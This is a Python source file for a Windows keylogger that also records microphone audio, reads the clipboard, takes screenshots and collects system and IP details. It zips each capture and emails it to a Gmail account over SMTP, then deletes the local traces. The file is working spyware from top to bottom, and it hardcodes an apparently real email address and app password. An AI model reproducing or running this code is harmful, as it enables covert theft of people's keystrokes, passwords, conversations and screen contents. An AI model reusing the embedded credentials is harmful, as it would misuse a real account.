# Libraries
import os 
import sys  
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders  
import smtplib  
import socket  
import platform  
import sounddevice as sd  
from scipy.io.wavfile import write  
import win32clipboard  
import pyscreenshot as ImageGrab 
from pynput.keyboard import Key, Listener 
import time  
import zipfile 

# File paths and names
system_information = "system.txt"  
audio_information = "audio.wav" 
clipboard_information = "clipboard.txt"  
screenshot_information = "screenshot.png" 
keys_information = "key_log.txt"  
extend = "\\"  
# Specify the directory where files will be saved
file_path = "C:\\Users\\Public\\Documents"
# Time Controls
time_iteration = 15 
number_of_iterations_end = 2  
microphone_time = 10 

# Email Controls
email_address = "kushipudasaini@gmail.com"  
password = "qoie gsjs rrio pmbt"  


def send_email(filename, attachment):
   
    fromaddr = email_address 
    toaddr = email_address  
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "This is an automated email with the captured data. Keylogger testing done."
    msg.attach(MIMEText(body, 'plain'))
    zip_filename = filename + ".zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write(attachment, os.path.basename(attachment))
    with open(zip_filename, "rb") as zip_attachment:
        p = MIMEBase('application', 'zip')
        p.set_payload(zip_attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename= {zip_filename}")
        msg.attach(p)
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()

        print("Email sent successfully!")
    except smtplib.SMTPDataError as e:
        print(f"Failed to send email: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if os.path.exists(zip_filename):
            os.remove(zip_filename)

def computer_information():
    """
    Captures system and network information and saves it to a file.
    """
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()  
        IPAddr = socket.gethostbyname(hostname)  

        f.write("Processor: " + platform.processor() + "\n")  
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")  
        f.write("Hostname: " + hostname + "\n") 
        f.write("IP Address: " + IPAddr + "\n")  


computer_information()
send_email(system_information, file_path + extend + system_information)

def microphone():
    """
    Records audio from the microphone and saves it to a file.
    """
    fs = 44100  
    seconds = microphone_time 

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) 
    sd.wait()  

    write(file_path + extend + audio_information, fs, myrecording)

microphone()
send_email(audio_information, file_path + extend + audio_information)

def copy_clipboard():
    """
    Captures the contents of the clipboard and saves it to a file.
    """
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard() 
            pasted_data = win32clipboard.GetClipboardData()  
            win32clipboard.CloseClipboard() 

            
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")


def screenshot():
    """
    Captures a screenshot and saves it to a file.
    """
    im = ImageGrab.grab()  
    im.save(file_path + extend + screenshot_information)  


number_of_iterations = 0  
currentTime = time.time()  
stoppingTime = time.time() + time_iteration 


while number_of_iterations < number_of_iterations_end:
    count = 0  
    keys = [] 

    def on_press(key):
        global keys, count, currentTime

        print(key)  
        keys.append(key)  
        count += 1  
        currentTime = time.time()  

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")  
                if k.find("space") > 0:  
                    f.write('\n')
                elif k.find("Key") == -1: 
                    f.write(k)
    def on_release(key):
        if key == Key.esc:  
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
       
        send_email(keys_information, file_path + extend + keys_information)

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
       
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information)
 
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information)

 
        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

time.sleep(400)

delete_files = [system_information, audio_information, clipboard_information, screenshot_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)
